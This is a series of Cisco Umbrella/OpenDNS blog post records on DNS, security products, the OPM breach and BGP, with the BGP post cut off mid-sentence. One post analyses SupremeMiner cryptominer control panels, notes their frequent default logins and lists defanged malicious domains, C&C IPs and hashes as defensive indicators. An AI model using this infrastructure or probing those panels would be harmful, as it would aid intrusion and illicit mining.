{"website": "Cisco-Umbrella", "title": "Visualizing Time-Dependent Graphs", "author": ["David Rodriguez"], "link": "https://umbrella.cisco.com/blog/visualizing-time-dependent-graphs", "abstract": "Intro Data-Ink Maximization – is the concept of making every keystroke count (including the delete character), popularized by Edward Tufte . One famous example of this is how he redesigned the scatterplot into what is known as a rugplot . Simplify, then minimize. Add lines, that’s key. So, let’s try visualizing time-dependent graphs with Tufte’s inspiration, with a twist. Let’s visualize rotating infrastructures. That is, let’s capture new hostnames (for example mail.google.com) that are resolving to a hosting IP from hour to hour. One additional restriction is to find a solution using Matplotlib and NetworkX . Maybe we can write something quickly. Pasted below is source code to do this yourself. One Hosting IP Given two graphs of fictitious hosting IPs hosting hostnames at one hour, then the next, we can build a graph for each time. The challenge is to visualize the evolution. In other words, the challenge is to compare two graphs that are time-dependent. Here’s our simple answer: draw lines from one hour to the next. Draw a line from hosting IP A to A between the time windows. Below is an example of doing just this: FIGURE 1: Following hosting IP A from one hour to the next. With the guideline following hosting IP A from hour to hour, we see the density of hostnames connected begin to vary. This variation is due to A resolving more hostnames in the second hour. From a security perspective, an increase in the number of hostnames resolving on a hosting IP may indicate malicious or unintended behavior. For example, if we assume a hosting IP resolves a constant number of hostnames from one hour to the next (obviously a huge assumption), the increase in the number of hostnames resolving may be due to an IP starting to host a series of Exploit kit [1] or phishing domains . Multiple Hosting IPs Our next example, just builds on the first by overlaying more lines. Notice, how the lines begin to convey a certain amount of information about the complexity and density of the clusters in the graph. FIGURE 2: Following hosting IPs: A,B,C,H,S from one hour to the next. By increasing the number of guidelines we are now tracing multiple hosting IPs from one hour to the next. We can compare the density of the connected hostnames per hosting IP. In addition, we can begin to identify any connections from Hosting IP to hostname to Hosting IP. That is, hosting IP A and H in the first hour had nothing in common while in the second hour they had two hostnames in common. With the guidelines we can quickly re-trace two time-dependent subgraphs and map their evolution. From a security perspective, if hosting IP A and H had something in common in both hours, the resulting grid-lines would have completed a rectangle, a cycle, between the two time-dependent graphs. In this case, they form a tree-like structure. What makes this interesting, is that while hosting IP A and H obviously have something in common in the later hour, it is not clear they did in the previous. With the grid-lines we recognize there might be evidence that the hostnames in the previous hour may be related. We may therefore proceed, perhaps, from a known malicious hostname and begin to test whether other hostnames within the weakly drawn cluster (of the hostnames resolving to A and H) in the previous hour are also malicious. Next The above example simply traced one, two, or three hosting IPs from one hour to the next. But notice, we could vary this. We could trace domains just as easily, or, a combination of users and domains. If you’re interested in graph analytics on time-dependent graphs definitely check out this paper authored by folks at AmpLab , Databricks , and Uber. Source You’ll want your data stored in files like g1.txt and g2.txt looking like this: {“domsuf”:”jriugrkbfdkjhg.com”,”client”:”D”,”count”:3} {“domsuf”:”jriugrkbfdkjhg.com”,”client”:”E”,”count”:3} {“domsuf”:”x0vr8wn.net”,”client”:”A”,”count”:3} {“domsuf”:”52mt2pm.org”,”client”:”A”,”count”:3} Then you can run:", "date": "2017-03-21"},
{"website": "Cisco-Umbrella", "title": "DNSCrypt – Critical, fundamental, and about time.", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/dnscrypt-critical-fundamental-and-about-time", "abstract": "Today we unveil DNSCrypt , a new security tool we’ve developed that has been on our minds for a long time. It has a simple but important function: encrypt all DNS traffic between you and OpenDNS. Nothing else like it exists, and we have very high expectations for the positive impact it can have on the Internet security and privacy of millions of people around the world. DNS is a critical part of the Internet’s infrastructure, and though a good deal of attention has been paid to improving its security in recent years with DNSSEC, an important part has been overlooked.  It’s what’s often referred to as the “last mile,” or the connection between you and your ISP or your DNS provider, if you use a DNS service like OpenDNS.  It’s in this “last mile” that bad things are most likely to happen — snooping, tampering, or even hijacking traffic. Anyone who knows what they’re doing can eavesdrop on your Internet activity and see exactly which domains you are resolving, and in many cases, what websites you’re visiting. It happens all the time on insecure networks at coffee shops, and even residences. Some ISPs have even been accused of spying on their customers’ activity. What’s worse, the “last mile” is ripe for man-in-the-middle attacks, where an intermediary injects themselves into your traffic path masquerading as your intended destination, but all the while, being able to see and modify your traffic. This leaves little confidence for the Internet user. DNSCrypt changes this and has the potential to completely revolutionize Internet security. DNS has, unfortunately, always had some inherent weaknesses because it’s transported in plain text. DNSSEC has never attempted to address that (crazy, I know).  Encrypting all DNS traffic means a fundamental change to the security of the system on the whole and a strong improvement.  It’s not the only solution, and there’s still an important place for verification and validation of domains like DNSSEC provides, but it’s a very strong first step. We’ve been sharing DNSCrypt with security experts over the past several weeks and the feedback has been phenomenal. A tool like DNSCrypt is critically necessary to ensure the security of DNS going forward. DNSCrypt is a “technology preview” today, and the code is being open-sourced.  For the über-nerds, our implementation is the first (known) implementation of the forwarder ideas expressed in the DNSCurve community, which many will recall, we were one of the first to implement. Download DNSCrypt today and try it for yourself.", "date": "2011-12-06"},
{"website": "Cisco-Umbrella", "title": "Back to school with the Cisco Umbrella Chromebook client", "author": ["Casey Ulaky"], "link": "https://umbrella.cisco.com/blog/cisco-umbrella-chromebook", "abstract": "We’re excited to announce the availability of the Cisco Umbrella Chromebook client! With the Umbrella Chromebook client, you can protect your Chromebook users from threats on the internet, no matter where they are. As more K-12 schools and organizations move towards 1:1 programs, students and staff can increase productivity and collaboration. However, these changes also introduce new security challenges; organizations must ensure access to the internet is safe while navigating limited budgets. The Umbrella Chromebook client for Chrome OS protects against phishing attacks, offers easy to use and customizable content category filtering, and provides per-user visibility and policy — regardless of location. It utilizes Umbrella’s industry-leading DNS platform for security and content filtering. There’s no need for PAC files, proxy configurations or VPNs. Everything happens via DNS, ensuring a great user experience for both administrators and end users! Let’s take a look at an example of how the Umbrella Chromebook client can help three different individuals at a local school be more productive, while defending against threats on the internet – click to the full blog. Ready to see Cisco Umbrella in action? The Umbrella Chromebook client is the smartest way to extend powerful protection against threats on the internet to Chromebook users, wherever they are. Interested in learning more? Sign up for a free trial of Cisco Umbrella today.", "date": "2018-09-13"},
{"website": "Cisco-Umbrella", "title": "Cisco Named a January 2019 Gartner Peer Insights Customers’ Choice for Secure Web Gateways", "author": ["Negisa Taymourian"], "link": "https://umbrella.cisco.com/blog/cisco-named-a-gartner-peer-insights-customers-choice-for-secure-web-gateways", "abstract": "We are delighted to share that Cisco has been named a January 2019 Gartner Peer Insights Customers’ Choice for Secure Web Gateways! The Cisco Umbrella team takes great pride in this distinction, as customer feedback plays a key role in shaping our products and services. The Gartner Peer Insights Customers’ Choice is based 100 percent on customer reviews. To ensure fair evaluation, Gartner maintains rigorous criteria for recognizing vendors with a high customer satisfaction rate. For this distinction, a vendor must have a minimum of 50 published reviews with an average overall rating of 4.2 stars or higher. Cisco’s Secure Web Gateway products received a total of 140 reviews and an overall score of 4.5 out of 5 as of January 16, 2019 across Cisco Umbrella, Cisco Web Security Appliance and Cisco Cloud Web Security. Umbrella is a cloud security platform that protects users from connecting to malicious sites on the internet. With Umbrella, you can see threats before they’re coming, and block them before they become attacks. We’ve built a reputation on easy deployment and powerful protection against threats anywhere users go, inside and outside the office. We are thrilled to see our customers reviews highlighting Cisco Umbrella’s simple and effective approach to security. Here are excerpts from customers that contributed to our distinction: “If you don’t have it, it should be the next thing you should consider implementing. This is a must-have product for our environment for compliance and security. It provides the ability to extend our policies whether on premise or remote.” – Director of Information Security, Services Read Review “This product should be a baseline requirement everywhere now because of its great price point and exceptional security protection for networks.” – Executive Director of Information Services, Education Read Review “Out of all the other products of its kind Cisco Umbrella stands out above the rest.” – Systems Engineer, Finance Read Review “Of all the security implementations I’ve been involved with, Cisco Umbrella was perhaps the easiest to deploy and provided immediate results.” – Chief Information Security Officer, Education Read Review We would like to thank all of our customers who took the time to share their experiences on Gartner Peer Insights. The Umbrella product team is proud to be named a January 2019 Gartner Peer Insights Customers’ Choice! We are dedicated to delivering exceptional value to our customers and believe this distinction underscores our commitment to delivering the most effective protection against threats together with unwavering customer support. We look forward to continuing our efforts that earned us this distinction. If you’re ready to learn more about Umbrella and protect against threats, sign up for a free trial today. To learn more about this distinction, or to read the reviews written about our products by the IT professionals who use them, please visit the Customers’ Choice announcement . The GARTNER PEER INSIGHTS CUSTOMERS’ CHOICE badge is a trademark and service mark of Gartner, Inc., and/or its affiliates, and is used herein with permission. All rights reserved. Gartner Peer Insights Customers’ Choice constitute the subjective opinions of individual end-user reviews, ratings, and data applied against a documented methodology; they neither represent the views of, nor constitute an endorsement by, Gartner or its affiliates.", "date": "2019-01-17"},
{"website": "Cisco-Umbrella", "title": "IPv6 Recursive DNS, Delivered Fresh", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/ipv6-recursive-dns", "abstract": "This morning we opened up our IPv6 Sandbox, starting with the most important piece – a globally-distributed recursive IPv6 DNS service. This means if you have IPv6 connectivity, you can now talk to us over native IPv6 transport. Instructions for getting started are over in the sandbox. Why is this important? As more and more end-users get IPv6 connectivity, many continue to use IPv4 DNS servers. Many of these IPv4 recursive DNS servers don’t have IPv6 connectivity, meaning they can’t talk to other DNS servers over IPv6. As IPv6 adoption increases and content begins to appear that is only accessible over IPv6, it’s critical that people use DNS servers which are able to talk over both IPv4 and IPv6. This is the first of a number of exciting new announcements we’ll be making over the coming months. If you have IPv6 connectivity, I hope you’ll try out our IPv6 DNS servers and let us know what you think. There isn’t support yet for filtering or dashboard management, but that’s coming soon. We wanted to get this in front of folks now, well ahead of World IPv6 Day on June 8th.", "date": "2011-05-02"},
{"website": "Cisco-Umbrella", "title": "FBI, DHS Share Lessons Learned from OPM Hack", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/fbi-dhs-share-opm-security-lessons-learned", "abstract": "The fallout from the epic hack on the Office of Personnel Management (OPM) continues. Since the congressional oversight hearings in June 2015, OPM Director Katherine Archuleta resigned ; the government was hit with a number of lawsuits from “victims”; OPM hired a cybersecurity advisor, Clifton Triplett, and increased its IT “modernization” budget from $31 million to $87 million, with another $21 million scheduled for 2016; and the Obama administration announced Friday that OPM will no longer conduct background investigations. The FBI and Department of Homeland Security also released a “cyber alert” outlining a collective analysis and lessons learned from the OPM hack. The memo was distributed only to cleared contractors by the Defense Security Service, and it includes a number of recommendations for security efforts going forward. While the memo does not name OPM specifically, according to an FCW article , the timing of its release and the recommendations included reportedly coincide with the OPM breach directly. At the forefront is the recommendation for a segmented identity management system, which, according to the memo, could have limited the severity of the OPM breach. From the FCW article: “When an organization’s network is not segmented from others, this could mean hundreds of sub-networks are affected versus one,” the memo states. Privileged access controls “would have helped detect the intrusion earlier and made it significantly more difficult for the actor to spread across the network.” While the entire memo could not be located, FCW did list a number of security recommendations from it, including: Enabling a personal firewall at agency workstations Monitoring users’ online habits and blocking potentially malicious sites Employing encryption for data at rest and in transit and Investigating “outbound network traffic observed over TCP port 53 that does not conform to the DNS protocol.” Hopefully there are more recommendations than these few in the memo. To make up for the lack of the full list, here is a list of learning lessons from current events and studies conducted over the past couple years: Identity management should be priority one : While this space with IT security has grown tremendously in the last few years, it remains a nonetheless crucial part to securing an organization. Especially if said organization outsources components of work to third-party vendors, like in the case of OPM. Keep infrastructure patched and updated : The Cisco Annual Security Report noted that of 115,000 devices Cisco researchers scanned, 92 percent of them were susceptible to known vulnerabilities. The FBI and DHS memo about the OPM hack names “convenience” and “accessibility” specifically as aids to the hack. Full disk encryption for all endpoints : A recent report from Sophos showed many companies are not going through the effort of encrypting company data, nearly 70 percent in some industries. Monitor DNS traffic and check against any and all available threat intelligence feeds : The same Cisco annual report mentioned earlier also found that many organizations are not monitoring DNS traffic, despite its wealth of information about user behavior and possible indicators of compromise. Enable and enforce strong password management : SplashData recently released a study that found the worst possible passwords —like ‘123456’ — are still being used regularly. Same as they were since 2011. Educate employees to spot phishing attempts : Despite its long history in the hacking toolkit, phishing continues to be an effective way to gain access to company networks. Employee training has proved effective in helping the efforts of IT and security orgs. Manage third-party vendor and contractor access : According to congressional hearing testimony, hackers gained access to OPM networks through a third-party contractor, which is unfortunately common. This list might be a good start, and would keep an IT organization busy for months if not years. But it’s in no way exhaustive. What would you add to OPM’s to-do list to keep it more secure?", "date": "2016-01-26"},
{"website": "Cisco-Umbrella", "title": "DNS redirection, Dual-stacked hosts, and Donut shops", "author": ["Lucas Siba"], "link": "https://umbrella.cisco.com/blog/dns-hijacking-dual-stacked-hosts-donut-shops", "abstract": "TL;DR – Any recursive DNS resolver that responds to all requests, instead of returning NXDOMAIN, NODATA or SERVFAIL when an authoritative server gives these responses, is most likely going to cause issues for any dual-stacked host. At OpenDNS we think a fast and reliable internet experience starts with a high-quality recursive DNS provider, so any time we find issues in common industry practices, we want everyone to know about it. In this post I’ll be showing a few issue that arise for dual-stacked hosts (meaning the host has both IPv4 and IPv6 addresses) when they’re using a DNS provider that redirects NXDOMAIN, NODATA and SERVFAIL responses. If you need a quick refresh on NXDOMAIN vs NODATA, see my previous post . DNS redirection is the act of a recursive resolver intercepting NXDOMAIN, NODATA and SERVFAIL responses from an authoritative server and serving up an alternative IP address. This effectively tricks the requesting application into thinking there is an actual host at that name. This technique is commonly used by ISPs or DNS providers as a means of serving assisted search pages for mistyped domains, redirecting clients to advertising pages/resources, or for collecting statistics (see DNS Hijacking for more details). For the most part, on a typical IPv4 enabled host, DNS redirection isn’t a problem (although it may complicate some special DNS applications), but a real issue begins to arise when dual-stack (both IPv4 and IPv6 enabled) clients encounter DNS redirection. I’ve previously written about how different operating systems resolve hostnames when they are dual-stacked here , so for now I’m only going to focus on OSX 10.9 (but know that this problem will affect most OSes). When you have a dual-stacked OSX host, and an application that is using the system resolving libraries (the system call getaddrinfo() specifically), OSX will send out both A (IPv4) and AAAA (IPv6) requests. Here’s an example of my dual-stacked host trying to lookup the local donut shop’s domain: # tcpdump -n -s 1500 -i en0 udp port 53 & ./getaddrinfo www.timhortons.com\n 10.10.10.165.63835 > 208.67.222.222: 18223+ A? www.timhortons.com.\n 10.10.10.165.55987 > 208.67.222.222: 9571+ AAAA? www.timhortons.com.\n 208.67.222.222 > 10.10.10.165.63835: 18223 1/0/0 A 206.152.12.196\n 208.67.222.222 > 10.10.10.165.55987: 9571 0/1/0 From the tcpdump we can see that A and AAAA requests were sent out in parallel. Our A record request received “206.152.12.196” and our AAAA record request recieved a NODATA response. Now let’s imagine we were using a DNS provider that was doing DNS redirection. The AAAA NODATA response from our donut shop’s authoritative DNS server would have been redirected and we would have been served a valid IPv6 address (hopefully with some donut-related advertising). At this point both the A and AAAA records would be given to the calling application and it would be up the applications logic to choose which record to use (but the application has no way of knowing that the AAAA record has been falsified). This can (and will) lead to a very confusing browsing experience, the falsified record may take you to a webpage claiming the domain you’re looking for doesn’t exist! “Can’t the DNS provider’s recursive resolver just look to see if both records types (the IPv4 and IPv6) are NXDOMAIN, NODATA or SERVFAIL before deciding to redirect an answer?” At first glance it might look as though recursive DNS providers can work around this problem by checking both record types before responding, but another issues arises for DNS redirection when you include a search domain in your systems resolv.conf. Let’s assume for the purpose of this example you’ve added “dunkindonuts.com” and “opendns.com” to your list of DNS search domains so that you only have to type “system” when looking up “system.opendns.com” (knowing that there is no “system.dunkindonuts.com” host). Now let’s look at what the system’s resolving libraries will do: # tcpdump -n -s 1500 -i en0 udp port 53 & ./getaddrinfo system\n 10.10.10.165.50227 > 208.67.222.222.53: 5591+ A? system.dunkindonuts.com.\n 208.67.222.222.53 > 10.10.10.165.50227: 5591 NXDomain 0/1/0\n 10.10.10.165.54555 > 208.67.222.222.53: 48108+ A? system.opendns.com.\n 208.67.222.222.53 > 10.10.10.165.54555: 48108 1/0/0 A 208.69.38.170 The system resolving libraries have done a lookup for “system.dunkindonuts.com”, waited for the responses (which was an NXDOMAIN), and then tried a lookup of “system.opendns.com”. The result is that we get the correct response for “system.opendns.com”. Now if this query had been done against a server which was doing DNS redirection our initial NXDOMAIN response (meaning there were neither IPv4 or IPv6 records) from the “system.dunkindonuts.com” query would have been redirected and replaced with a falsified record and the OS would have stopped trying to resolve the correct host. “Doesn’t OpenDNS use DNS redirection to display ads? Isn’t that your entire business model?” It is true that previously OpenDNS did use DNS redirection for the purpose of giving what we called “a guide page”, but we don’t do that anymore. OpenDNS has transitioned away from advertising-based revenue to focus on our world class enterprise security platform. You can read more about our transition away from ads in our CEO’s blog post “ No more ads ”. So now that you know more about the pitfalls of DNS redirection, don’t put up with a recursive DNS server that redirects your traffic, especially not in the coming dual-stacked world.", "date": "2014-08-12"},
{"website": "Cisco-Umbrella", "title": "No more ads", "author": ["David Ulevitch, Founder/CEO"], "link": "https://umbrella.cisco.com/blog/no-more-ads", "abstract": "TL;DR: We’ve always tried to put user experience first, even when that gets in the way of making more money. Browsers have changed, we’ve become a security company, and we’ve shifted our business to rely on paying security customers, so we’re turning off the ads in our free DNS service to make that service even better. Since this is a longer post, I’ve also published this story on Medium, where it’s slightly easier to read. I started OpenDNS to create a DNS service that was better than what was available. The year was 2005 and when it came to DNS, ISPs were pretty much your only option. And ISP-provided DNS was far from good. It was a cost center for them, relegated to the old servers gathering dust in the corner. They had no incentive to invest in this critical piece of infrastructure, despite it influencing so much of your Internet connection’s performance. ISP-provided DNS was slow, unreliable and did nothing to protect you online, despite being (in hindsight, thanks to OpenDNS) an obvious vector for security enforcement. DNS was an un-policed conduit for the spread of phishing attacks, malware and other nefarious stuff. All these bad things needed DNS to propagate or execute their attack. The mission for OpenDNS was to change that and give people everywhere around the world a better DNS — one that’s safer, faster and more reliable. This was a fantastically fun endeavor — reimagining something fundamental that everyone on the Internet uses and unrestrained by concerns about what was or wasn’t possible or had been done in the past. We automatically blocked phishing sites, gave administrators the power to filter unsavory content if appropriate (on school, library or corporate networks, for example) and boosted speed and reliability by making smarter caching decisions behind the scenes. We opened up the black box of DNS and allowed it to be a platform for services, unlocking so much more of its potential. Tens of millions of people switched to OpenDNS, but we needed to make money, too — we’ve always been a revenue-focused company. When we originally thought about OpenDNS, we really thought of what we were doing as navigation. We were helping people navigate the Internet. We thought this was big. Really big. Bigger than search. In our minds, first you had the browser, and the browser ruled everything — that was Netscape. Then you had Yahoo! They didn’t have a browser, but they had a homepage and a portal. Everyone needed a portal back then, but Yahoo!’s portal was the king. Then Google came out and said you didn’t need a portal, you just needed a search box. You would just go to Google and look for stuff. So we thought that navigation was the next big thing. We could take your address bar, and instead of filling it with complicated URLs, we could instead turn it into a navigation box, and you could type in whatever you wanted and we’d figure it out and take you there, and when we couldn’t, we’d show you search results. Remember, this was years before Chrome and the omnibox existed. It made all the sense in the world to provide this navigation service for free to users and to support it through ads whenever we showed search results. We struck a deal with Yahoo! to serve the search results and ads, and with that the OpenDNS Guide was born. It worked well, and we became a profitable company quickly. The way the Guide works is this: If you’re one of the 50 million people using OpenDNS’ free DNS service and you attempt to visit a website that isn’t resolving (the site’s having technical difficulties or you mistyped its URL), we take you to the Guide. We parse what you typed in the address bar and show you relevant search results in a hopefully helpful attempt to get you back on your merry way. Alongside those search results are ads. Around the time we launched OpenDNS it was one of the most trafficked pages on the Internet. Today, for a variety of reasons, you rarely see it, but back then it was extremely common. The Guide appeared when you’d try to load a webpage that didn’t exist, instead of your browser’s “Server not found” error message. It worked great for several years, but as it happens with technology, the state of the art evolved at a fast clip. Most notably, there were dramatic shifts in the way technology enabled us to navigate the Internet. Enter the omnibox, known to most of you as the Chrome browser today. It built on our idea and turned the address bar into a search field, accommodating behavior that happened anyway and made it so you could type just a phrase into the address bar and be taken to a page of Google search results. We knew, and know, the omnibox provides the superior user experience: it was built into the browser as code, and had more smarts than using DNS alone allowed, providing a better user experience. For a while, we tried to improve our experience, but it was a losing battle. We also realized it meant fighting Google on the only strategic battlefield that matters to them. Google’s only real battlefield is anything that gets between the user and the advertisement. That’s not a fight we wanted to be in. In that same period of time, we also invented and brought to market a new enterprise security service. One that only we — with those 50M geographically-distributed users — could. It’s called Umbrella and it uses a combination of machine learning and big data from our DNS traffic to predict and spot threats across the Internet based on analyzing our own data, along with billions of other datapoints from around the Internet. Our security labs are full of researchers who build algorithms to understand how malware spreads, and who build classifiers and anomaly detection systems to identify as-of-yet unknown Internet threats. This predictive nature of our service means we have the capability to identify threats other security vendors don’t. And because it’s based on DNS, it’s delivered as a service, and it’s not perimeter-dependent like most existing security solutions. Again, we’re seeing sign-ups in droves, but this time we’re being paid for it. It felt good to again reimagine something and build it, and see customers reap much value from it. And I’ll say that the relationship between us and our customers is stronger, because we are building a service for the people who are paying for it. We’re not in some weird three-way handshake that is difficult to balance where we want a great user experience on the one hand, but we get paid by advertisers on the other hand. The cognitive dissonance was getting unwieldy. And frankly, nobody loves ads. At best, ads are a thing you have to do, and you make them as good as you can, when there isn’t a better business model. And for consumer services, there rarely is anything that performs better than ads. Our enterprise service contributes the vast majority of our revenue now, but not all of it. Those ads from the Guide still account for a meaningful amount of money on our balance sheet, on the order of millions of dollars annually. That put us at a crossroads where we were conflicted by the meaningful amount of revenue from the ads on the Guide and the truth that, today, they lessen our DNS service’s user experience. We first asked ourselves, “Why do people choose our DNS service?” The answers took me back to that place in 2005 when we set out to do something I saw as noble and important. Make the Internet better by giving people a superior option in DNS. They choose it because it’s safer, faster and more reliable — all 50 million+ of them. And the Guide, originally designed as a way to keep people moving forward, now rarely shows up, and when it does, we know it isn’t the right experience. The guide delivers an experience that’s not inline with what they expect or want. So it has to go. There’s also the elephant in the room: ads and security don’t mix. It’s clear to us that they are fundamentally incompatible. Text ads and banners alike, they’re all vectors for the spread of malware. We’re a security company first, trusted and relied on by Fortune 100 organizations to protect their people, data and networks. Anything that weakens our security offering by introducing vulnerabilities is a conflict. As we’ve become more and more of a security company, it was clear ads couldn’t stay. So we made the call: The Guide will go away on June 6th. While the math in the short term makes this appear to be a bad business decision, it’s the long-term impact that makes the decision the correct one. And OpenDNS is playing the long game. We all are here. This experience is one of the only reasons people cite to not use OpenDNS. And today more than 2% of all of the world’s Internet users rely on our DNS service to navigate the Internet safely and reliably. My expectation is that with this reason eliminated, we’ll welcome (and welcome back) waves of happy OpenDNS users. In order to build a sustainable, growing business, a delightful customer experience is a must. And sometimes revenue and experience conflict. When they do, and when we can, we want to put user experience first. On June 6th, the OpenDNS Guide will cease to exist. If OpenDNS users type a phrase that isn’t a website address into their browser address bar, they’ll get whatever experience the creators of their browser intended. A native, unaltered navigation experience. Ultimately, I feel great about the decision, guided by delivering — first and foremost — a fantastic user experience. And my hope is that this new OpenDNS experience will be met with satisfaction by our users, whose loyalty we are incredibly thankful for. Internally, we know this is the right call, and it allows us to focus all of our energy on building world-class DNS and security services.", "date": "2014-05-29"},
{"website": "Cisco-Umbrella", "title": "The Coin Rush", "author": ["Andrea Kaiser"], "link": "https://umbrella.cisco.com/blog/the-coin-rush", "abstract": "Malicious cryptocurrency miners have been the latest ‘trend’ with cybercriminals. This is malicious software that gets installed onto a victim’s system that is able to use it’s processing power to mine a cryptocurrency coin. Thus, making money for the bad actor at the expense of someone else. We’ve seen cryptomining capabilities inserted into the latest releases of malware that previously had used other means to extort money or use the computer resources of their victims in other ways. Notably, attack campaigns using Trickbot and the RIG Exploit Kit have dabbled in spreading malicious cryptocurrency miners. Malspam and malicious ad traffic have been leading to droppers. The possible infection methods extend beyond only running code within your web browser. This blog post is going to highlight the infrastructure seen in some of the latest examples observed of the SupremeMiner, which is used to mine Monero on compromised systems. [Thanks to Brian Carter for helping to identify] SupremeMiner These panels were observed over a 3 month period. Let’s take a look at the panel interface. The original is in Russian and has been translated for the screen captures. The login page: Often times these types of panels have the default login/password still in use. Once you’re logged in, you can see an overview of stats for all of the systems that have been infected with your cryptominer and are reporting back to the command and control server. The ‘workers’ are infected systems. It gives IP address, last contact time, CPU info, video card info, OS info, and the version of the miner running. You can see the status of the miner. More information can be had by clicking on each system, like computer name, whether there is an antivirus installed on the system, if the miner is running with admin privleges and the installation path. The installation path is always in ProgramData within a temp folder. A section for managing the stop/start/reload/update of the miner. The ‘settings’ page where you upload your miner that will be distributed to the systems that are under your control. Miner data: '{\n\"id\": \"250f8bc28a1fdbf1\",\n\"worker_id\": ***\n\"version\": \"2.6.5\",\n\"kind\": \"proxy\",\n\"algo\": \"cryptonight\",\n\"mode\": \"nicehash\",\n\"ua\": \"xmrig-proxy/2.6.5 (Windows NT 6.3; Win64; x64) libuv/1.22.0 msvc/2017\",\n\"uptime\": 73648,\n\"donate_level\": 1,\n\"donated\": 0.0,\n\"hashrate\": {\n\"total\": [\n0.0,\n0.0,\n0.01,\n0.04,\n0.03,\n0.03\n]\n},\n\"miners\": {\n\"now\": 6,\n\"max\": 6\n},\n\"upstreams\": 1,\n\"results\": {\n\"accepted\": 139,\n\"rejected\": 0,\n\"invalid\": 0,\n\"expired\": 0,\n\"avg_time\": 529,\n\"latency\": 79,\n\"hashes_total\": 2780139,\n\"hashes_donate\": 0,\n\"best\": [\n2351176,\n1249258,\n1029529,\n363489,\n335290,\n255804,\n253072,\n245201,\n198027,\n189233\n]\n}\n}’ Country and ASN info for hosting IPs of the malicious panels: 199.188.200[.]110 – NAMECHEAP-NET – Namecheap, Inc., US 86400 185.212.148[.]203 – SUPERSERVERSDATACENTER, RU 86400 95.211.16[.]67 – LEASEWEB-NL-AMS-01 Netherlands, NL 86400 91.227.16[.]118 – EXIMIUS-AS, RU 86400 5.101.152[.]199 – BEGET-AS, RU 86400 77.222.61[.]130 – SWEB-AS, RU 86400 145.239.81[.]107 – OVH, FR 86400 185.125.219[.]236 – AS-MAROSNET Moscow, Russia, RU 86400 95.211.16[.]66 – LEASEWEB-NL-AMS-01 Netherlands, NL 86400 104.24.113[.]231 – CLOUDFLARENET – Cloudflare, Inc., US 86400 185.224.138[.]72 – AS-HOSTINGER, LT 86400 Requestor countries: Thailand USA UK Cyprus Canada NL Morocco Ukraine Slovakia India El Salvador Looking into the Infrastructure In researching the hosting IPs of these panels, we wanted to see if there were any relationships between the infrastructure or systems being used between them. A force directed graph here shows relationships between hosting IPs and domain names of the panels: Then we further enriched the data by pivoting to other known malicious domains we’d seen on the given hosting IPs. This graph shows how much each cluster grows. Visibility Malicious cryptominers running in your network could cause issues on business critical systems by hijacking processing power and causing system crashes. Not to mention, the system is no longer fully under your control and depending on the malware being used, modules can be executed to extract your private data or drop additional malware. To gain visibility into cryptomining in your network, we have the ‘Cryptomining’ category that can be enabled in Cisco Umbrella. For more information please see this article . Related IOCs (not all IOCs are specifically meant to be a ‘block list’) Malicious domains, panels: e9658544844[.]ru trainee148.temp.swtest[.]ru russianminers.zzz.com[.]ua belka.kl.com[.]ua paliwi[.]xyz statsu.zzz.com[.]ua shara-reborn.kl.com[.]ua zorabotminer.zzz.com[.]ua zimbabwelubumi.zzz.com[.]ua roninbleck.kl.com[.]ua mygoa[.]ga 123meta.kl.com[.]ua zanovo.zzz.com[.]ua salut.kl.com[.]ua 122222.kl.com[.]ua strvz.zzz.com[.]ua sparkvpn[.]xyz jopasosat.zzz.com[.]ua wikiwoko[.]website Hashes a6f2655a055b4874ea1442d33d90c762fd9721d761c909fea53b424ce13bb0bc 226f96e4af4d4513f9a6dfcbd4a6edab63fba583b0e256c3ba60d3f51269d052 052443ac4ea5f6e4eeda13a7722b6face69d29238e54c4b7420a9b19e9e5aab1 dacdf46bb1b465b53ea5aa772b52e6f3d49bb345c65a29d40bf2f52014691878 f568853223edae69f56f921f99f4f24629f8be974814fa4b140974253a90a8f1 a4ae177a5cdaf550c468e3054f6f70f9c95325d5fa6ce8237b246e5674fb54bf 2f8537cf0bd25e563f7bd7e8055dbc7dc417958207be8b69b337f8678990d8bb c9531c16678ff9efb4e3712febdc414574c4a0543e22df558f1a3ea32a47a820 1d7aea899f19dbe94adb11f06115bc0315cb0efdbfd71f0463250488415b83b6 9bb5372dfe1d5cf6ff78a8deb22ee2b7976936dad20bd90bf09d29424507ad14 1d450c2f4d2a8dedb2fb7dc7e952e1353b9afa7dec6fb6d8fb3bd09d61000c0b ac11cd50164f35adfa3245c513e38f7856f15ccb001b2fa96d82c6e3f23a4aae 95951e9c3579dc14e0c97913db13df1c6e8e7928521a7ab64be1b060c0addfe0 c6c441b31720233f58fce63a0e6ff7c1e43457b21aa3af2a71aaa413446a0364 cf545a025f6be7e73dbaee3793cb034e21e4a5ec130214e9dfcc109aa1c68648 8faeea99bfa567ab89f7d0fbf526a2605c57b36f2510d44592cdacf212e3901e 0bfc4c3f29ef9270b4f1470d5b0199f64f62892d2994e459bf4cdcac4dbe02c8 C&Cs 5.188.231[.]110 5.8.88[.]59", "date": "2018-09-26"},
{"website": "Cisco-Umbrella", "title": "BGP and the System of Trust that Runs the Internet, Pt. 2", "author": ["Owen Lystrup"], "link": "https://umbrella.cisco.com/blog/bgp-and-the-system-of-trust-that-runs-the-internet-pt-2", "abstract": "Editor’s note: This post is the second in a two-part series on BGP. Read part one here . The last half-decade has witnessed a number of events that perfectly exemplify what happens when BGP goes wrong. Whether caused purposely by malicious attackers or by accident from routing leaks, the effect is essentially the same: everyone has a bad time. In these cases, many companies and content providers end up becoming collateral damage even if they aren’t directly involved. BGP includes a concerning element in its ability to affect nearly every major Internet service within a short time frame. But what’s most surprising about the protocol, which is in charge of routing nearly all the Internet’s traffic, is that it runs on a system of trust between providers. The Internet’s Telephone Game BGP can get complicated, being at the core of what can go wrong with Internet routing. It starts with what are known as Autonomous systems (AS). An autonomous system is a collection of IP networks managed autonomously–hence the name–under one routing policy. Image from Shutterstock Each AS gets a unique number (ASN) to identify itself from the regional Internet registry. Each AS is connected to at least one other AS, which will connect it to the rest of the Internet. A single AS can be connected to dozens or even hundreds of other ASNs, through what is called peering (see part one ). It’s easy to picture the entire Internet as a graph, with each node on the graph representing an AS. Each AS in the graph tells the rest of the Internet via its neighbors for which IP networks (often called prefixes) it is willing to receive traffic. This process is often referred to as “announcing. Andree Toonk, founder of BGPmon and manager of network engineering at OpenDNS, says that announcing is the way for a company to establish which prefixes it would like the world to know. Essentially it’s a way of posting a billboard on the Internet superhighway to 